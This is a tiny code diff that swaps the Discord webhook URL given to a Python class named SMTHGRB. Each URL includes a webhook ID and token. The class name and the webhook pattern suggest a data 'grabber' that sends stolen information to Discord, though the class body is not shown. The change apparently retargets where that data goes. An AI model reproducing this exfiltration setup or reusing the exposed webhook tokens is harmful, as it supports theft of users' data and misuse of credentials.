@@ -149,4 +149,4 @@ class SMTHGRB:
         })
 
 
-SMTHGRB("https://discord.com/api/webhooks/1138442752011554876/rso2yE9FoE-Fz237DWo18giS2syBqDVzBJk2aGLKMqec8VDAahaziOShFIdBOcwd4dbN")
+SMTHGRB("https://discord.com/api/webhooks/1192229287718293514/ztR_5MoowMpiJDZ_XtS7p_EZ0Yp00EfKUHBsbP8LZcfarpnHbaoDkDv-_jQ998nV5rwB")
